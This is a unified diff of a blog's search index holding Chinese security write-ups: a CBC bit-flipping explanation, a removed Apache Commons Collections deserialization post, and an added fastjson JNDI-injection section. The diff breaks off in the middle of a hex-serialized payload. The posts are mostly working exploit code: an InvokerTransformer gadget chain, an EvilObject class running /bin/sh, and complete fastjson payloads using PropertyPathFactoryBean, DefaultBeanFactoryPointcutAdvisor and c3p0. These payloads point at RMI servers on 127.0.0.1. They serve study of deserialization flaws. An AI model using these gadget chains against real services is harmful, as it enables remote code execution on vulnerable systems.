@@ -1,61 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>CBC字节翻转攻击</title>
-    <url>/2020/05/08/cbc-reverse/</url>
-    <content><![CDATA[<p>在CBC模式中，每个明文块先与前一个密文块进行异或后，再进行加密。在这种方法中，每个密文块都依赖于它前面的所有明文块。同时为了保证保证即使对相同明文多次加密，也可以得到不同的密文，在第一个块中使用<font color=#008000>IV(初始化向量)</font>。当获取到一组明文与其对应的IV，密文时，即可发起CBC字节翻转攻击。</p>
-<a id="more"></a>
-
-<h1 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h1><p><strong>加密过程如下所示</strong>:</p>
-<p><img src="1.png" alt=""></p>
-<p>文字版的加密过程：</p>
-<ol>
-<li>首先将明文分组(常见于以16字节一组)，位数不足进行填充。</li>
-<li>生成一个随机的初始化向量(IV)和一个密钥。</li>
-<li>将IV和第一组明文异或。</li>
-<li>用密钥对异或的结果使用密钥key进行加密，得到密文C1。</li>
-<li>使用C1与第二组明文进行异或，然后使用key加密，得到密文C2。</li>
-<li>重复4-5,直到最后一组明文。</li>
-<li>将IV和加密后的密文拼接在一起，得到最终的密文。</li>
-</ol>
-<h1 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h1><p><strong>解密过程如下所示</strong>:</p>
-<p><img src="2.png" alt=""></p>
-<p>文字版的解密过程：</p>
-<ol>
-<li>从密文中提取出IV，然后将密文分组。</li>
-<li>使用密钥key对第一组密文进行解密，然后和IV进行异或得到第一组明文。</li>
-<li>使用key对第二组密文进行解密，然后和第一组密文进行异或得到第二组明文。</li>
-<li>重复3，直到最后一组密文。</li>
-</ol>
-<h1 id="CBC翻转攻击"><a href="#CBC翻转攻击" class="headerlink" title="CBC翻转攻击"></a>CBC翻转攻击</h1><p><strong>CBC翻转攻击原理</strong>:</p>
-<p>而CBC翻转攻击与解密过程有关。直观来看，IV会影响到第一组明文的值，而每一组明文的值都会被前一组密文所影响。若第一块密文中的某个字节被改变，则解密出来的第二组明文对应的字节也会被改变。可以从下图看出这整个过程</p>
-<p><img src="3.png" alt=""></p>
-<p>可以得知，某组密文的改变会影响到其对应的明文块的<font color=#008000>完全改变</font>以及下一个明文块中<font color=#008000>对应位置的改变</font>。</p>
-<p>此攻击造成的影响:</p>
-<ol>
-<li>绕过过滤器</li>
-<li>改变用户权限提升至管理员</li>
-<li>…</li>
-</ol>
-<p><strong>CBC翻转攻击过程</strong></p>
-<p>具体的如何改变明文呢？假设要改变第二组明文的值，那么就需要改变对应的第一组密文的值。这里就要利用到异或的原理，若<code>A = B XOR C</code>，那么<font color=#008000><code>A XOR B XOR C = 0</code></font>。所以，<code>0 XOR ANY = ANY</code>。假设ANY为最终我们想要改变的明文字节值。 有如下的计算方式:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">P[1] &#x3D; decrept(C[1]) XOR IV</span><br><span class="line">P[2] &#x3D; decrept(C[2]) XOR C[1]</span><br><span class="line"></span><br><span class="line">ANY &#x3D; P[2] XOR decrept(C[2]) XOR C[1] XOR ANY</span><br><span class="line"></span><br><span class="line">ANY &#x3D; decrept(C[2]) XOR (P[2] XOR C[1] XOR ANY)</span><br><span class="line">C&#39;[1] &#x3D; P[2] XOR C[1] XOR ANY</span><br></pre></td></tr></table></figure>
-
-<p>由上述可知，改变的密文字节值的计算方式为<font color=#008000><code>P[2] XOR C[1] XOR ANY</code></font>。python中使用如下方式进行计算</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">chr(ord(C[<span class="number">1</span>])^ord(P[<span class="number">2</span>])^ord(ANY))</span><br></pre></td></tr></table></figure>
-
-<p>对应的明文确实如期地改变了，但由于密文C[1]的变化，使得明文P[1]的结果也面目全非。而明文P[1]的结果与IV相关，IV为我们可控。因此按照同样的方法改变IV的值，最终就得到了更改后的密文和IV。</p>
-<p>对此感兴趣的同学可以<a href="https://p0sec.net/index.php/archives/99/" target="_blank" rel="noopener">p0’s</a>师傅出得一道题来看看。</p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
-<li><a href="https://maplege.github.io/2018/11/19/CBC-reverse/" target="_blank" rel="noopener">CBC字节反转攻击原理</a></li>
-<li><a href="https://p0sec.net/index.php/archives/99/" target="_blank" rel="noopener">CBC字节翻转攻击</a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>密码攻击</category>
-      </categories>
-  </entry>
-  <entry>
     <title>SSRF-内网Redis Getshell</title>
     <url>/2020/04/17/SSRF-Redis/</url>
     <content><![CDATA[<p>Redis是常见的内网服务，因其默认配置未授权访问或使用弱口令认证，可以导致getshell。这篇文章通过实验的方式介绍了四种内网Redis Getshell的方式。</p>
@@ -175,49 +120,58 @@
       </categories>
   </entry>
   <entry>
-    <title>Apache Commons Collections分析</title>
-    <url>/2020/04/20/common-collections/</url>
-    <content><![CDATA[<p>由于java序列化/反序列化的需求，开发过程中常使用一些公共库。Apache Commons Collections是一个扩展了java标准库里的Collection结构的第三方基础库。它为Java提供了很多基础常用且强大的数据结构，方便开发。这个组件出现反序列化问题，由于很多类引起的。这里介绍其中一种方式的原理，与<font color=#008000><code>TransformedMap</code></font>和<font color=#008000><code>InvokerTransformer</code></font>有关。</p>
+    <title>CBC字节翻转攻击</title>
+    <url>/2020/05/08/cbc-reverse/</url>
+    <content><![CDATA[<p>在CBC模式中，每个明文块先与前一个密文块进行异或后，再进行加密。在这种方法中，每个密文块都依赖于它前面的所有明文块。同时为了保证保证即使对相同明文多次加密，也可以得到不同的密文，在第一个块中使用<font color=#008000>IV(初始化向量)</font>。当获取到一组明文与其对应的IV，密文时，即可发起CBC字节翻转攻击。</p>
 <a id="more"></a>
 
+<h1 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h1><p><strong>加密过程如下所示</strong>:</p>
+<p><img src="1.png" alt=""></p>
+<p>文字版的加密过程：</p>
+<ol>
+<li>首先将明文分组(常见于以16字节一组)，位数不足进行填充。</li>
+<li>生成一个随机的初始化向量(IV)和一个密钥。</li>
+<li>将IV和第一组明文异或。</li>
+<li>用密钥对异或的结果使用密钥key进行加密，得到密文C1。</li>
+<li>使用C1与第二组明文进行异或，然后使用key加密，得到密文C2。</li>
+<li>重复4-5,直到最后一组明文。</li>
+<li>将IV和加密后的密文拼接在一起，得到最终的密文。</li>
+</ol>
+<h1 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h1><p><strong>解密过程如下所示</strong>:</p>
+<p><img src="2.png" alt=""></p>
+<p>文字版的解密过程：</p>
+<ol>
+<li>从密文中提取出IV，然后将密文分组。</li>
+<li>使用密钥key对第一组密文进行解密，然后和IV进行异或得到第一组明文。</li>
+<li>使用key对第二组密文进行解密，然后和第一组密文进行异或得到第二组明文。</li>
+<li>重复3，直到最后一组密文。</li>
+</ol>
+<h1 id="CBC翻转攻击"><a href="#CBC翻转攻击" class="headerlink" title="CBC翻转攻击"></a>CBC翻转攻击</h1><p><strong>CBC翻转攻击原理</strong>:</p>
+<p>而CBC翻转攻击与解密过程有关。直观来看，IV会影响到第一组明文的值，而每一组明文的值都会被前一组密文所影响。若第一块密文中的某个字节被改变，则解密出来的第二组明文对应的字节也会被改变。可以从下图看出这整个过程</p>
+<p><img src="3.png" alt=""></p>
+<p>可以得知，某组密文的改变会影响到其对应的明文块的<font color=#008000>完全改变</font>以及下一个明文块中<font color=#008000>对应位置的改变</font>。</p>
+<p>此攻击造成的影响:</p>
+<ol>
+<li>绕过过滤器</li>
+<li>改变用户权限提升至管理员</li>
+<li>…</li>
+</ol>
+<p><strong>CBC翻转攻击过程</strong></p>
+<p>具体的如何改变明文呢？假设要改变第二组明文的值，那么就需要改变对应的第一组密文的值。这里就要利用到异或的原理，若<code>A = B XOR C</code>，那么<font color=#008000><code>A XOR B XOR C = 0</code></font>。所以，<code>0 XOR ANY = ANY</code>。假设ANY为最终我们想要改变的明文字节值。 有如下的计算方式:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">P[1] &#x3D; decrept(C[1]) XOR IV</span><br><span class="line">P[2] &#x3D; decrept(C[2]) XOR C[1]</span><br><span class="line"></span><br><span class="line">ANY &#x3D; P[2] XOR decrept(C[2]) XOR C[1] XOR ANY</span><br><span class="line"></span><br><span class="line">ANY &#x3D; decrept(C[2]) XOR (P[2] XOR C[1] XOR ANY)</span><br><span class="line">C&#39;[1] &#x3D; P[2] XOR C[1] XOR ANY</span><br></pre></td></tr></table></figure>
 
+<p>由上述可知，改变的密文字节值的计算方式为<font color=#008000><code>P[2] XOR C[1] XOR ANY</code></font>。python中使用如下方式进行计算</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">chr(ord(C[<span class="number">1</span>])^ord(P[<span class="number">2</span>])^ord(ANY))</span><br></pre></td></tr></table></figure>
 
-<h2 id="关键类介绍"><a href="#关键类介绍" class="headerlink" title="关键类介绍"></a>关键类介绍</h2><h3 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h3><p><code>TransformerdMap</code>这个类是用来对Map进行某些变换用的。当一个元素被<font color=ff0000><code>添加/删除/修改</code></font>过时，会自动调用<code>tranform</code>方法自动进行特定的修饰变换，变换的逻辑由Transformer类定义。</p>
-<p>通过decorate函数可以将一个普通的<code>Map</code>转换为一个<code>TransformedMap</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Map transformedMap &#x3D; TransformedMap.decorate(map,keyTansformer,valueTransformer);</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>第二个参数和第三个参数分别对应于当Map中的key和value改变时需要做的操作。</p>
-</blockquote>
-<h3 id="Tranformer"><a href="#Tranformer" class="headerlink" title="Tranformer"></a>Tranformer</h3><p><code>Transformer</code>是一个接口，实现<code>transform(Object input)</code>方法即可进行实际的变换操作，上述代码若修改了其中的任意key或value，都会调用<code>tranform</code>方法进行变换操作。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers &#x3D; new Transformer[]&#123;</span><br><span class="line">	new ConstantTransformer(...);</span><br><span class="line">	new InvokerTransformer(...)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Transformer chainedTransformer &#x3D; new ChainedTransformer(transformers);</span><br><span class="line">Map transMap &#x3D; TransformedMap.decorate(rawMap,null,chainedTransformer);</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>若想进行一系列的变换操作，可以通过定义一个chainedTransformer来实现，只需要传入一个Transformer数组即可。</p>
-</blockquote>
-<p>ChainedTranformer的工作原理很简单，将上一个变换的结果作为下一次变换的输入，直到左右的变换完成，并返回最终的object。Commons Collections内置了许多常见的transformer，无需手工编写，其中InvokerTransformer可以通过调用Java反射机制来调用任意函数。</p>
-<h2 id="构造chainedTransformer"><a href="#构造chainedTransformer" class="headerlink" title="构造chainedTransformer"></a>构造chainedTransformer</h2><h3 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h3><p><code>InvokerTransformer</code>相当于<code>Transformer</code>的一种。观察它的<code>tranform</code>函数，如下所示:</p>
-<p>org/apache/commons/collections/functors/InvokerTransformer.class<br><img src="1.png" alt=""></p>
-<p>从图上可知，关键部分在于通过<code>getClass()</code>、<code>getMethod()</code>以及<code>invoke()</code>来进行反射，查找并调用给定的方法。InvokerTransformer接受3个参数，分别是调用方法的名称，参数类型，调用参数。参数类型要对应于调用方法所指定的参数类型。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class&#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0]&#125;)</span><br></pre></td></tr></table></figure>
-
-<h3 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h3><p>内置的<code>ConstantTranformer</code>类可以获取到特定的类。<br><img src="2.png" alt=""></p>
-<h3 id="构造链"><a href="#构造链" class="headerlink" title="构造链"></a>构造链</h3><p>在构造的chain中，最终的实现类似于</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">((Runtime) Runtime.class.getMethod(&quot;getRuntime&quot;).invoke()).exec(&quot;ifconfig&quot;)</span><br></pre></td></tr></table></figure>
-
-<p>因此第一步是获取到Runtime类，通过内置的<code>ConstantTransformer</code>来获取，然后通过<code>InvokerTransformer</code>来反射调用getMethod方法，参数是getRuntime，以此来获取到<code>Runtime.getRuntime</code>。以此类推，构造出调用invoke和exec的<code>InvokerTransformer</code>，整个chain就结束了。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers &#x3D; new Transformer[] &#123;</span><br><span class="line">new ConstantTransformer(Runtime.class),</span><br><span class="line">new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class&#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class&#125;, new Object[] &#123;null, new Object[0]&#125;),</span><br><span class="line">new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class&#125;, new Object[] &#123;&quot;&#x2F;Applications&#x2F;Calculator.app&#x2F;Contents&#x2F;MacOS&#x2F;Calculator&quot;&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Transformer transformChain &#x3D; new ChainedTransformer(transformers);</span><br></pre></td></tr></table></figure>
-
-<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>构造完这样的一个chain之后，只需要将一个<code>Map</code>类型的数据转换为<code>TransformedMap</code>，然后对其中的key,value进行操作，即可达到反序列化命令执行。可新建一个test.java进行测试。</p>
-<p>test.java</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformer &#x3D; new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;&#x2F;Applications&#x2F;Calculator.app&#x2F;Contents&#x2F;MacOS&#x2F;Calculator&quot;&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">	Transformer transformedChain &#x3D; new ChainedTransformer(transformer);</span><br><span class="line"></span><br><span class="line">	Map&lt;String,String&gt; beforetransMap &#x3D; new HashMap&lt;String,String&gt;();</span><br><span class="line">	beforetransMap.put(&quot;name&quot;,&quot;ananaskr&quot;);</span><br><span class="line">        </span><br><span class="line">	Map transformedMap &#x3D; TransformedMap.decorate(beforetransMap,transformedChain,transformedChain);</span><br><span class="line"></span><br><span class="line">	Map.Entry onlyElement &#x3D; (Map.Entry) transformedMap.entrySet().iterator().next();</span><br><span class="line">    onlyElement.setValue(&quot;ananaskr1&quot;);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>结果如下:<br><img src="3.png" alt=""></p>
+<p>对应的明文确实如期地改变了，但由于密文C[1]的变化，使得明文P[1]的结果也面目全非。而明文P[1]的结果与IV相关，IV为我们可控。因此按照同样的方法改变IV的值，最终就得到了更改后的密文和IV。</p>
+<p>对此感兴趣的同学可以<a href="https://p0sec.net/index.php/archives/99/" target="_blank" rel="noopener">p0’s</a>师傅出得一道题来看看。</p>
 <h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
-<li><a href="https://www.freebuf.com/vuls/175252.html" target="_blank" rel="noopener">Apache-Commons-Collections反序列化漏洞分析</a></li>
-<li><a href="https://javasec.org/javase/JavaDeserialization/Collections.html" target="_blank" rel="noopener">Apache Commons Collections反序列化漏洞</a></li>
+<li><a href="https://maplege.github.io/2018/11/19/CBC-reverse/" target="_blank" rel="noopener">CBC字节反转攻击原理</a></li>
+<li><a href="https://p0sec.net/index.php/archives/99/" target="_blank" rel="noopener">CBC字节翻转攻击</a></li>
 </ul>
 ]]></content>
       <categories>
-        <category>JAVA安全</category>
+        <category>密码攻击</category>
       </categories>
   </entry>
   <entry>
@@ -292,7 +246,7 @@
 <p>然后跟进byteValue()</p>
 <p><img src="10.png" alt=""></p>
 <p>在这里进行了base64解码。</p>
-<h1 id="利用链分析之JNDI注入-JdbcRowSetImpl"><a href="#利用链分析之JNDI注入-JdbcRowSetImpl" class="headerlink" title="利用链分析之JNDI注入(JdbcRowSetImpl)"></a>利用链分析之JNDI注入(JdbcRowSetImpl)</h1><p>由于此利用方式需要用到JNDI注入，对此不了解的可以先了解一下。此次利用JNDI注入需要满足2个条件:</p>
+<h1 id="利用链分析之JNDI注入"><a href="#利用链分析之JNDI注入" class="headerlink" title="利用链分析之JNDI注入"></a>利用链分析之JNDI注入</h1><h2 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h2><p>由于此利用方式需要用到JNDI注入，对此不了解的可以先了解一下。此次利用JNDI注入需要满足2个条件:</p>
 <ol>
 <li>存在有漏洞的代码(即lookup(uri)，且uri可控)</li>
 <li>Java版本(&lt;=jdk1.8_113) (RMI利用方式)</li>
@@ -309,7 +263,7 @@
 <p>到这里，JdbcRowSetImpl类提供了一个可以进行JNDI注入的入口点。</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span>  Exception</span>&#123;</span><br><span class="line">        JdbcRowSetImpl jdbcRowSet = <span class="keyword">new</span> JdbcRowSetImpl();</span><br><span class="line">        jdbcRowSet.setDataSourceName(<span class="string">"rmi://127.0.0.1:1099/aa"</span>);</span><br><span class="line">        jdbcRowSet.setAutoCommit(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h2 id="EXP构造-1"><a href="#EXP构造-1" class="headerlink" title="EXP构造"></a>EXP构造</h2><p>因此，在进行fastjson反序列化时，需要调用该类的setDataSourceName函数和setAutoCommit函数。那么构造payload传入了<code>dataSourceName</code>变量和<code>autoCommit</code>值。</p>
+<h3 id="EXP构造-1"><a href="#EXP构造-1" class="headerlink" title="EXP构造"></a>EXP构造</h3><p>因此，在进行fastjson反序列化时，需要调用该类的setDataSourceName函数和setAutoCommit函数。那么构造payload传入了<code>dataSourceName</code>变量和<code>autoCommit</code>值。</p>
 <p>而实际上，在JdbcRowSetImpl类中并没有这两个成员变量，但传入的payload中若有这2个变量，便可调用对应的setter方法。非常神奇的一点认识。不过联想到fastjson反序列化时获取成员变量的一套逻辑，便可以想通了。</p>
 <p>因此payload为:</p>
 <font color=#008000>
@@ -318,7 +272,7 @@
 
 </font>
 
-<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>首先在web服务器上放入恶意的class文件。在所在目录下利用php内置服务器起一下(<code>php -S 0.0.0.0:2333</code>)。</p>
+<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>首先在web服务器上放入恶意的class文件。在所在目录下利用php内置服务器起一下(<code>php -S 0.0.0.0:2333</code>)。</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilObject</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">EvilObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		Runtime rt = Runtime.getRuntime();</span><br><span class="line">        String[] commands = &#123;<span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>, <span class="string">"open /Applications/Calculator.app"</span>&#125;;</span><br><span class="line">        rt.exec(commands);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 
@@ -330,6 +284,46 @@
 
 <p>在JDK1.8_111环境下，运行的结果如下图所示:</p>
 <p><img src="9-1.png" alt=""></p>
+<h2 id="PropertyPathFactoryBean"><a href="#PropertyPathFactoryBean" class="headerlink" title="PropertyPathFactoryBean"></a>PropertyPathFactoryBean</h2><p>利用此类在fastjson反序列化过程中进行JNDI注入需要依赖于以下的第三方包</p>
+<ul>
+<li>spring-beans</li>
+<li>spring-context</li>
+<li>spring-core</li>
+</ul>
+<p>在正式开始分析之前，首先介绍一个在spring-context中类<code>org.springframework.jndi.JndiTemplate</code>。它是spring里面用来简化对JNDI的操作的类，提供了lookup、bind方法。来看看它的lookup方法。</p>
+<p><img src="1-2.png" alt=""></p>
+<p>可以看到正好满足了jndi注入的条件，现在需要考虑的是如何调用到此函数，且参数name可控。接着定位到<code>org.springframework.jndi.JndiLocatorSupport</code>类的lookup函数。</p>
+<p><img src="2-2.png" alt=""></p>
+<p>该类继承了JndiAccessor类，JndiAccessor类中的getJndiTemplates()函数返回的就是一个JndiTemplate对象。那么接着要找一个调用了JndiLocatorSupport类的lookup函数的类或者直接调用了JndiTemplate类的lookup函数的类。定位到<code>org.springframework.jndi.support.SimpleJndiBeanFactory</code>类。</p>
+<p><img src="3-2.png" alt=""></p>
+<p>该类继承自JndiLocatorSupport类，且在多个函数中调用了lookup函数。例如，<code>getBean()</code>、<code>doGetType</code>、<code>doGetSingleton</code>。虽然这里有getBean()函数，但由于它存在入口参数，所以不能在反序列化时被自动调用。那么就继续往下看，看看调用了这三个函数之一的其他函数。定位到<code>org.springframework.beans.factory.config.PropertyPathFactoryBean</code>类的<code>setBeanFactory()</code>。</p>
+<p><img src="4-2.png" alt=""></p>
+<p>可以看到在该函数中调用了this.beanFactory.getBean()函数，SimpleJndiBeanFactory实现了BeanFactory类，且setBeanFactory()函数满足fastjson反序列化时自动调用的条件。到此整个分析结束。</p>
+<h3 id="EXP构造-2"><a href="#EXP构造-2" class="headerlink" title="EXP构造"></a>EXP构造</h3><p>上面分析了整个过程。首先待反序列化的类是<code>PropertyPathFactoryBean</code>，根据条件。</p>
+<ul>
+<li>1）需要给成员变量beanFactory赋值且赋值为<code>SimpleJndiBeanFactory</code>类的对象。</li>
+<li>2 需要给targetBeanName赋值为jndi的url。</li>
+</ul>
+<p>因此，payload形式为:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;: &quot;org.springframework.beans.factory.config.PropertyPathFactoryBean&quot;,</span><br><span class="line">	&quot;targetBeanName&quot;: &quot;rmi:&#x2F;&#x2F;127.0.0.1&#x2F;EvilObject&quot;,</span><br><span class="line">	&quot;beanFactory&quot;: &#123;</span><br><span class="line">						 &quot;@type&quot;:&quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;</span><br><span class="line">					&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后看setBeanFactory()函数中要走到getBean()的条件。</p>
+<p><img src="5-2.png" alt=""></p>
+<p>很显然，这里的targetBeanName不为null，会走到下面的判断。当propertyPath不为null的情况下，才会继续往下走。</p>
+<p>因此payload增加为:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;: &quot;org.springframework.beans.factory.config.PropertyPathFactoryBean&quot;,</span><br><span class="line">	&quot;targetBeanName&quot;: &quot;rmi:&#x2F;&#x2F;127.0.0.1&#x2F;EvilObject&quot;,</span><br><span class="line">	&quot;propertyPath&quot;:&quot;foo&quot;,</span><br><span class="line">	&quot;beanFactory&quot;: &#123;</span><br><span class="line">						 &quot;@type&quot;:&quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;</span><br><span class="line">					&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后就调用this.beanFactory.getBean()方法。    其实在这里不是很能理解，为什么需要加上”shareableResources”的值为[“rmi://127.0.0.1:1099/EvilObject”]。这是必须条件，如果不填写这个值，反序列化beanFactory的时候就会失败，走不到this.beanFactory.getBean()。</p>
+<p>之后的完整的payload为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;: &quot;org.springframework.beans.factory.config.PropertyPathFactoryBean&quot;,</span><br><span class="line">	&quot;targetBeanName&quot;: &quot;rmi:&#x2F;&#x2F;127.0.0.1&#x2F;EvilObject&quot;,</span><br><span class="line">	&quot;propertyPath&quot;:&quot;foo&quot;,</span><br><span class="line">	&quot;beanFactory&quot;: &#123;</span><br><span class="line">						 &quot;@type&quot;:&quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;</span><br><span class="line">						 &quot;shareableResources&quot;:[&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;EvilObject&quot;]</span><br><span class="line">					&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h3><p>完整的demo</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="comment">//@dependency&#123;fastjson:1.2.24 ,spring-beans,spring-context,spring-core&#125;</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">propertypathFactorybbean</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        String payload = <span class="string">"&#123;\"rand1\": &#123;\"@type\": \"org.springframework.beans.factory.config.PropertyPathFactoryBean\",\"targetBeanName\": \"rmi://127.0.0.1:1099/EvilObject\",\"propertyPath\": \"foo\",\"beanFactory\": &#123;\"@type\": \"org.springframework.jndi.support.SimpleJndiBeanFactory\",\"shareableResources\": [\"rmi://127.0.0.1:1099/EvilObject\"]&#125;&#125;&#125;"</span>;</span><br><span class="line">        Object res = JSON.parseObject(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>此外还有以下payload可以尝试。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;rand1&quot;: Set[</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;@type&quot;: &quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;,</span><br><span class="line">    &quot;beanFactory&quot;: &#123;</span><br><span class="line">      &quot;@type&quot;: &quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;,</span><br><span class="line">      &quot;shareableResources&quot;: [</span><br><span class="line">        &quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;EvilObject&quot;</span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;adviceBeanName&quot;: &quot;rmi:&#x2F;&#x2F;127.0.0.1:10099&#x2F;EvilObject&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;@type&quot;: &quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;</span><br><span class="line">  &#125;</span><br><span class="line">]&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;rand1&quot;: &#123;</span><br><span class="line">    &quot;@type&quot;: &quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;,</span><br><span class="line">    &quot;userOverridesAsString&quot;: &quot;HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c